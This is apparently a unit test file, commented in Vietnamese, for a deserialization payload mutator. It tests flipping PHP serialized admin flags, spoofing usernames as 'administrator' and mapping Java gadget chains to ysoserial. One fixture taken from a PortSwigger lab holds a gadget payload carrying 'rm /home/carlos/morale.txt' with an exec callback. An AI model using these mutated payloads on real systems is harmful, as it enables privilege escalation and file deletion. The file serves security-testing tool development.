"""
Unit test cho Analyze/payloadMutation.py — tap trung vao 3 ham mutate PHP
(flip_boolean/modify_string/modify_integer) va bo parser PHP serialize
(_read_php_token/_iter_php_pairs) vua duoc viet lai de fix cac bug:
  1. __modify_string() dam nham KEY (ten field) voi VALUE (gia tri) trong
     cau truc xen ke s:N:"KEY";VALUE;s:N:"KEY2";VALUE2;... cua PHP serialize.
  2. Regex s:(\\d+):"([^"]+)" bi cat ngan khi VALUE chua dau ngoac kep ben
     trong (hop le vi PHP serialize length-prefixed, khong can escape).
  3. __flip_boolean() dung .replace() khong neo vi tri, co the sua nham noi
     dung string khong lien quan chua trung substring "b:0"/"b:1", va doi
     TAT CA field boolean cung luc thay vi tach rieng tung field.
"""

import base64
import sys
import os
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from Analyze.payloadMutation import PayloadMutation


def mutate(payload: str, probe: str, exploit_type: str = "x") -> list:
    exploit = {"suggested_probe": probe, "exploit_type": exploit_type}
    vector = {"value": payload, "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"}
    return PayloadMutation(exploit, vector).mutate()


def decoded_payloads(results: list) -> list:
    return [base64.b64decode(r["payload"]).decode() for r in results]


class TestModifyStringTargetsValuesNotKeys(unittest.TestCase):
    """Regression: __modify_string() phai chi doi VALUE, khong bao gio dung
    vao KEY (ten field) - truoc fix, payload that tu result1.json sinh ra
    7/11 mutation sai (doi ten field thay vi gia tri)."""

    REAL_PORTSWIGGER_PAYLOAD = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'

    def test_only_mutates_the_value_wiener_not_the_key_username(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        payloads = decoded_payloads(results)
        for p in payloads:
            self.assertIn('s:8:"username"', p, "Ten field 'username' khong duoc bi doi")
        self.assertTrue(any('"administrator"' in p and 's:8:"username";s:13:"administrator"' in p for p in payloads))

    def test_exact_mutation_count_is_four_not_eleven(self):
        # Truoc fix: 11 mutation (7 sai vi dam key/value). Sau fix: dung 4
        # (chi doi gia tri "wiener", bo qua gia tri trung "admin").
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        self.assertEqual(len(results), 4)

    def test_embedded_quote_inside_string_value_does_not_break_parsing(self):
        # Gia tri PHP string CHUA dau ngoac kep ben trong (hop le, length-prefixed)
        inner = 'a"b"c"d"e'
        payload = f'a:1:{{s:8:"username";s:{len(inner)}:"{inner}";}}'
        results = mutate(payload, "modify_string")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 4)
        for p in payloads:
            # Payload mutate ra phai la PHP serialize HOP LE - khong con dinh
            # rac cua noi dung cu (vd "c"d"e" khong duoc xuat hien lac long)
            self.assertTrue(p.endswith(";}"), f"Payload hong cu phap: {p!r}")
            self.assertNotIn('"c"d"e"', p)

    def test_nested_object_container_is_skipped_not_recursed_into(self):
        # Payload that tu lab PortSwigger "Developing a custom gadget chain
        # for PHP deserialization" - co object O:... long ben trong.
        payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                   's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                   'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
        results = mutate(payload, "modify_string")
        # Khong field nao (default_desc_type/desc) khop hint username/admin/...
        self.assertEqual(results, [])

    def test_key_name_containing_hint_word_is_not_itself_mutated(self):
        # Class name "User" tinh co chua tu "user" - dam bao field KEY
        # "username" khong bi coi la target du no nam gan text co "user".
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        for p in decoded_payloads(results):
            self.assertTrue(p.startswith('O:4:"User":2:{s:8:"username";'),
                             "Key 'username' bi doi ten - regression cua bug dam key/value")


class TestFlipBooleanIsolatesEachField(unittest.TestCase):
    """Regression: __flip_boolean() phai (1) khong dung vao noi dung string
    khong lien quan, (2) sinh 1 mutation RIENG cho MOI field boolean thay vi
    doi tat ca cung luc."""

    def test_two_boolean_fields_produce_two_isolated_mutations(self):
        payload = ('O:4:"User":3:{s:8:"username";s:6:"wiener";'
                   's:8:"is_admin";b:0;s:9:"is_active";b:0;}')
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 2)
        self.assertIn('s:8:"is_admin";b:1;s:9:"is_active";b:0;', "".join(p for p in payloads if "b:1;s:9" in p))
        self.assertTrue(any('is_admin";b:1;s:9:"is_active";b:0' in p for p in payloads))
        self.assertTrue(any('is_admin";b:0;s:9:"is_active";b:1' in p for p in payloads))

    def test_string_value_containing_b0_substring_is_not_corrupted(self):
        text = 'comment=b:0 is code'
        payload = f'a:2:{{s:7:"comment";s:{len(text)}:"{text}";s:9:"is_active";b:0;}}'
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertIn(f's:{len(text)}:"{text}"', payloads[0],
                       "Noi dung string khong lien quan bi sua nham - regression cua bug replace khong neo vi tri")
        self.assertIn('is_active";b:1', payloads[0])

    def test_single_boolean_field_still_flips(self):
        payload = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertTrue(payloads[0].endswith('b:1;}'))


class TestModifyIntegerUsesPositionalReplace(unittest.TestCase):
    def test_two_fields_with_same_integer_value_mutated_independently(self):
        payload = 'a:2:{s:5:"level";i:5;s:5:"score";i:5;}'
        results = mutate(payload, "modify_integer")
        payloads = decoded_payloads(results)
        # Moi field i:5 (2 cai) x 5 gia tri trong int_values (khong cai nao = 5)
        # = 10 mutation, va tung mutation chi doi DUNG 1 trong 2 vi tri.
        self.assertEqual(len(payloads), 10)
        for p in payloads:
            self.assertEqual(p.count("i:5;"), 1, f"Phai con dung 1 vi tri i:5; chua doi: {p!r}")


class TestJavaChainMapAndExceptionHandling(unittest.TestCase):
    def test_rome_gadget_maps_to_real_ysoserial_chain(self):
        pm = PayloadMutation({"suggested_probe": "ysoserial", "exploit_type": "Rome Gadget"},
                              {"value": "x", "location": "c", "name": "n", "url": "u", "method": "GET"})
        self.assertEqual(pm._resolve_chains(), ["ROME"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
